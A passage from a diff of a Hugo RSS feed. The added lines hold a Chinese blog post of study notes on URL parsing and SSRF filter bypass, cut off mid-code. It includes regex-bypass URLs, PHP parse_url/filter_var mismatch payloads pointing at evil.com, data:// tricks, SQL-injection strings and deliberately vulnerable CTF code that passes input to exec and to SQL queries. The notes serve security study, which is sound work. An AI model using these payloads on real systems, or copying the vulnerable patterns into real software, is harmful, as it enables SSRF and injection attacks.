@@ -1,4 +1,905 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>NOTES&amp;SUMMARY on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/categories/notessummary/</link><description>Recent content in NOTES&amp;SUMMARY on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 30 May 2022 23:20:41 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/categories/notessummary/index.xml" rel="self" type="application/rss+xml"/><item><title>Java学习笔记Ⅴ</title><link>https://amiaaaz.github.io/2022/05/30/java-study-notes-05/</link><pubDate>Mon, 30 May 2022 23:20:41 +0800</pubDate><guid>https://amiaaaz.github.io/2022/05/30/java-study-notes-05/</guid><description>&lt;p>各路博客没少看，踩的坑怎么还超级多呢……所有参考链接附在文末&lt;/p>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>NOTES&amp;SUMMARY on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/categories/notessummary/</link><description>Recent content in NOTES&amp;SUMMARY on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 20 Jun 2022 12:18:18 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/categories/notessummary/index.xml" rel="self" type="application/rss+xml"/><item><title>URL解析&amp;重定向的二三事</title><link>https://amiaaaz.github.io/2022/06/20/url-parser-and-direction/</link><pubDate>Mon, 20 Jun 2022 12:18:18 +0800</pubDate><guid>https://amiaaaz.github.io/2022/06/20/url-parser-and-direction/</guid><description>&lt;p>说起与url有关的漏洞可能首先想到的是SSRF，我们可以直接访问服务器上的文件并探测内网信息，甚至可以RCE，下面我们来看看与url parser有关的问题和针对SSRF检测的绕过&lt;/p>
+&lt;p>&lt;strong>*注：本文大量内容参考自网络上已有的文章，全部参考链接贴在文末，本文仅作梳理自用，如有错漏还请师傅们不吝赐教&lt;/strong>&lt;/p>
+&lt;hr>
+&lt;h2 id="url构成">URL构成&lt;/h2>
+&lt;pre tabindex="0">&lt;code>scheme://username:password@address:port/path/to/resource?query_string=value#fragment
+&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://storage.tttang.com/media/attachment/2019/05/19/c50aebbf-193a-4ea3-be6a-65dc2deed1c2.png" alt="0.png">&lt;/p>
+&lt;ul>
+&lt;li>scheme标准&lt;/li>
+&lt;/ul>
+&lt;p>以&lt;code>[a-zA-Z]&lt;/code>开头，可以包含&lt;code>[a-zA-Z0-9+-.]&lt;/code>，用于标识URL的类型&lt;/p>
+&lt;ul>
+&lt;li>authority标准&lt;/li>
+&lt;/ul>
+&lt;p>1.除了最后一个@之外，user-info中的所有特殊字符都是URL编码的&lt;/p>
+&lt;p>2.在特殊scheme中，例如HTTP和FTP协议，\被视为路径分隔符，其用途与/相同&lt;/p>
+&lt;p>3.对于\、/、#和?这四个字符来说，第一个出现在URL中的那个字符，将被视为权限之间的分隔符，而不管它位于哪个组件中&lt;/p>
+&lt;ul>
+&lt;li>对子域名的常见正则与绕过&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>/.*.xcao.vip/
+httt://xxx.baidu.com
+/^(http|https):\/\/.*.baidu\.com/
+http://www.xcao.vip/?baidu.com
+/^(http|https):\/\/[0-1a-zA-Z\-]*.baidu\.com/
+http://xxxxbaidu.com
+/^(http|https):\/\/[^\.]+\.baidu\.com/
+http://2067398186/?baidu.com
+/^((http|https):\/\/[a-zA-Z\d-_\*@]+\.)+baidu\.com/
+http://454@.baidu.com@xcao.vip
+/^(http|https):\/\/([^\/\?#]+\.)*(baidu\.com)(\/|\?|#|$)/
+http://www.xcao.vip\.baidu.com
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>各类分隔符&lt;/li>
+&lt;/ul>
+&lt;p>部分字符被赋有特定含义&lt;/p>
+&lt;pre tabindex="0">&lt;code>; , / ? : @ = &amp;amp; . ..
+&lt;/code>&lt;/pre>&lt;p>在不同的语言中又有不同的表现&lt;/p>
+&lt;h2 id="php">PHP&lt;/h2>
+&lt;h3 id="parse_url">parse_url&lt;/h3>
+&lt;ul>
+&lt;li>url path中&lt;code>///&lt;/code>后部分被认作相对url，绕过对query的判断&lt;/li>
+&lt;li>对于&lt;code>123.57.254.42://ctf.pediy.com&lt;/code>这样的特殊url，会被parse_url识别host为后者，但被curl实际访问时会判断前者为host&lt;/li>
+&lt;li>即使没有协议仅有端口+字母（必须有字母）也会被解析（&lt;code>/pupiles.com:80a&lt;/code>，整个path都是这一串）&lt;/li>
+&lt;li>只接受一个&lt;code>@&lt;/code>&lt;/li>
+&lt;li>端口后面可以最多5个字符（包括特殊字符），多了会被丢弃（比如http://www.baidu.com:80xxx/会失败）；5.3.13版本下存在端口溢出&lt;/li>
+&lt;li>不接受host中存在&lt;code>\&lt;/code>&lt;/li>
+&lt;li>path中可以出现&lt;code>\&lt;/code>但不会被转换为&lt;code>/&lt;/code>，出现特殊字符比如&lt;code>\n&lt;/code> 空格 &lt;code>%00&lt;/code>等会被转义为&lt;code>_&lt;/code>，但是curl不识别&lt;/li>
+&lt;li>无法识别10进制等特殊进制的ip&lt;/li>
+&lt;/ul>
+&lt;h3 id="filter_var">filter_var&lt;/h3>
+&lt;p>测试用例&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;Argument: &amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// check if argument is a valid URL
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">filter_var&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#75af00">FILTER_VALIDATE_URL&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// parse URL
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">parse_url&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">print_r&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$r&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// check if host ends with google.com
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/google\.com$/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$r&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;host&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// get page from URL
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;curl -v -s &amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$r&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;host&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">print_r&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;Error: Host not allowed&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;Error: Invalid URL&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
+&lt;li>&lt;a href="http://evil.com">http://evil.com&lt;/a>;google.com&lt;/li>
+&lt;/ul>
+&lt;p>filter_var无法解析&lt;/p>
+&lt;ul>
+&lt;li>0://evil.com;google.com&lt;/li>
+&lt;/ul>
+&lt;p>filter_var可以解析，parse_url解析host=evil.com;google.com，scheme=0&lt;/p>
+&lt;ul>
+&lt;li>0://evil.com:80;google.com:80/&lt;/li>
+&lt;li>0://evil.com:80,google.com:80/&lt;/li>
+&lt;/ul>
+&lt;p>filter_var可以解析，parse_url解析host=evil.com:80;google.com，scheme=0，port=80，path=/，最终访问到evil.com:80&lt;/p>
+&lt;ul>
+&lt;li>0://evil$google.com（仅bash）&lt;/li>
+&lt;/ul>
+&lt;p>仅bash参数时，会将$google认作空变量，parse_url解析scheme=0，host=evil$google.com，但最终访问evil.com；所以如果达成这一点需要配合执行系统命令的函数，情况较少&lt;/p>
+&lt;h3 id="file_get_contents">file_get_contents&lt;/h3>
+&lt;p>测试用例&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;Argument: &amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// check if argument is a valid URL
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">filter_var&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#75af00">FILTER_VALIDATE_URL&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// parse URL
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">parse_url&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">print_r&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$r&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// check if host ends with google.com
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/google\.com$/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$r&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;host&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// get page from URL
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;Error: Host not allowed&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;Error: Invalid URL&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这里先经过filter_var检测url，再经过parse_url的解析要求host必须goole.com的字域，最后用file_get_contents获取最初获取的url的内容&lt;/p>
+&lt;p>特殊在这里的file_get_contents，意味着我们可以用data这样的伪协议&lt;/p>
+&lt;ul>
+&lt;li>data://text/plain;base64,SSBsb3ZlIFBIUAo=google.com&lt;/li>
+&lt;/ul>
+&lt;p>都正常解析，scheme=data，host=text，path=/plain;base64,SSBsb3ZlIFBIUAo=google.com，但是无法正常访问&lt;/p>
+&lt;ul>
+&lt;li>data://google.com/plain;base64,SSBsb3ZlIFBIUAo=&lt;/li>
+&lt;/ul>
+&lt;p>正常解析，scheme=data，host=google.com，path=/plain;base64,SSBsb3ZlIFBIUAo=，被正常解析到I love PHP&lt;/p>
+&lt;h3 id="asisctf-2016">[ASISCTF 2016]&lt;/h3>
+&lt;p>before php5.4.7&lt;/p>
+&lt;p>未复现成功&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">waf&lt;/span>&lt;span style="color:#111">(){&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$INFO&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">parse_url&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SERVER&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;REQUEST_URI&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$INFO&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">parse_str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$INFO&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;query&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">$query&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$filter&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;union&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;select&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;information_schema&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;from&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">foreach&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$query&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">$q&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">foreach&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$filter&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">$f&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;/i&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$q&lt;/span>&lt;span style="color:#111">)){&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;attack detected!&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$sql&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;select from ctf where id=&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sql&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">waf&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
+&lt;li>http://localhost//exp.php?/1=1&amp;amp;id=1&amp;rsquo; union select 1,2,3#&lt;/li>
+&lt;/ul>
+&lt;p>php7.2&lt;/p>
+&lt;pre tabindex="0">&lt;code>array (size=2)
+&amp;#39;host&amp;#39; =&amp;gt;string &amp;#39;exp.php&amp;#39; (length=7)
+&amp;#39;query&amp;#39; =&amp;gt; string &amp;#39;/1=i&amp;amp;id=1%27%20union%20select%201,2,3&amp;#39;(length=37)
+array (size=2)
+&amp;#39;/1&amp;#39;=&amp;gt;string &amp;#39;l&amp;#39;(length=1)
+&amp;#39;id&amp;#39; =&amp;gt;string &amp;#39;l&amp;#39; union select 1,2,3&amp;#39;(length=21)
+&lt;/code>&lt;/pre>&lt;p>php5.3&lt;/p>
+&lt;pre tabindex="0">&lt;code>array (size=2)
+&amp;#39;host’=&amp;gt; string &amp;#39;exp. php?’(length=8)
+&amp;#39;path’=&amp;gt; string &amp;#39;/1=1&amp;amp;id=1%27%20union%20select%201,2,3’(length=37)
+array (size=2)
+&amp;#39;/1’=&amp;gt; string &amp;#39;1’(1length=1)
+&amp;#39;id’=&amp;gt; string &amp;#39;l’union select 1,2,3’(1ength=21)
+&lt;/code>&lt;/pre>&lt;p>可以看到在5.3版本中query直接就是空的，所有参数都在path中，直接绕过过滤&lt;/p>
+&lt;h3 id="swpu-2017">[SWPU 2017]&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">error_reporting&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">Add_S&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">Add_S&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$_COOKIE&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">Add_S&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_COOKIE&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$_REQUEST&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">Add_S&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_REQUEST&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">Add_S&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$array&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">foreach&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$array&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>&lt;span style="color:#111">$value&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">is_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$value&lt;/span>&lt;span style="color:#111">)){&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$check&lt;/span>&lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/regexp|like|and|\&amp;#34;|%|insert|update|delete|union|into|load_file|outfile|\/\/i&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$value&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$check&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
